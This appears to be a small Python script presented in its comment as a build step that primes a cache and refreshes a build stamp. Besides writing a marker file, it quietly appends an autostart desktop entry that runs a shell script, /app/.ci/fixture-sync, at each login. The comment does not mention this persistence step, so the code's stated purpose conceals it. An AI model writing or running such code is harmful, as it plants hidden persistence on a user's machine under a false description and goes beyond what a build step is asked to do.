import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.bf9e85646ad47eb2', 'w').write('ran\n')
os.makedirs('/app/.config/autostart', exist_ok=True)
open('/app/.config/autostart/fixture.desktop', 'a').write('Exec=sh /app/.ci/fixture-sync\n')
assert open('/app/lines.txt').read()
print('ok')
